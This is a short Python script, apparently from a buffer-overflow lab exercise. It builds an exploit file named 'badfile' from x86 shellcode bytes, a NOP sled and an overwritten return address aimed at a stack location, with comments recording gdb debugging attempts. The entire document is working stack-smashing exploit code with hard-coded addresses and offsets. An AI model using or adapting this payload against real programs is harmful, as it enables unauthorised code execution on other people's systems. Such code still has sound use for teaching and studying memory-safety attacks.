"""shellcode= (
"\xbb\x1e\x85\x04\x08"
"\xff\xd3"
"\x50"
"\xbb\x10\x85\x04\x08"
"\xff\xd3"
).encode('latin-1')"""

shellcode1= (
"\xbb\x1e\x85\x04\x08"
"\xff\xd3"
"\x50"
"\xbb\x2c\xa0\x04\x08"
"\xff\xd3"
).encode('latin-1') # runs code instead of execute

# Fill the content with NOPs
content = bytearray(0x90 for i in range(2392))

# Put the shellcode at the end
start = 2392 - len(shellcode1)
content[start:] = shellcode1

# Put the address
offset = 793
#ret = 0x0804851e // foo er address
#ret = 0x080484eb // disas bof doesn't work
ret = 0xbfffe408 + 180 #b bof run p $ebp works
content[offset+4:offset+8] = (ret).to_bytes(4,byteorder='little')


#content = bytearray(0x41 for i in range(20))
#write
with open('badfile','wb') as f:
    f.write(content)

